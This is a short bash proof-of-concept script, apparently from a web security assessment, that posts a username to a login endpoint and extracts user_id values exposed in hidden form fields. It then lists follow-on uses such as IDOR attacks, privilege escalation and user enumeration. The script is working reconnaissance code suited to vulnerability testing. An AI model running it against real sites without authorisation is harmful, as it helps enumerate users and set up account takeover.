#!/bin/bash

# POC: User ID Information Disclosure in Password Form
# This script demonstrates how user_id values are exposed in hidden form fields
# during the login process, allowing user enumeration and information gathering

TARGET_URL="${1:-http://localhost:5000}"

echo "========================================="
echo "User ID Information Disclosure POC"
echo "========================================="
echo "Target: $TARGET_URL"
echo ""

echo "[*] Submitting username 'test' to /login endpoint..."
echo ""

response=$(curl -s -X POST "$TARGET_URL/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test" \
    -L \
    -c cookies.txt)

echo "[*] Response received. Analyzing for user_id disclosure..."
echo ""

# Try different patterns to find user_id
if echo "$response" | grep -qi "user_id"; then
    echo "[PASS] VULNERABILITY CONFIRMED: user_id found in response!"
    echo ""
    echo "[*] Raw response snippet containing user_id:"
    echo "$response" | grep -i "user_id" | head -5
    echo ""
    
    # Extract user_id value
    user_id=$(echo "$response" | grep -oiE 'user_id["\047]?\s*[:=]["\047]?\s*[0-9]+' | grep -oE '[0-9]+' | head -1)
    
    if [ -n "$user_id" ]; then
        echo "[PASS] Extracted user_id value: $user_id"
        echo ""
        echo "[*] This user_id is now exposed and can be used for:"
        echo "    - IDOR attacks via user_id parameter manipulation"
        echo "    - Privilege escalation attempts"
        echo "    - Targeted API calls with known user_id"
        echo "    - User enumeration and mapping"
    fi
else
    echo "[*] Searching for hidden form fields in response..."
    if echo "$response" | grep -qi "hidden"; then
        echo "[PASS] Found hidden form fields in response"
        echo "$response" | grep -i "hidden" | head -10
    else
        echo "[INFO] Response details for analysis (first 1500 chars):"
        echo "$response" | head -c 1500
    fi
fi

echo ""
echo "========================================="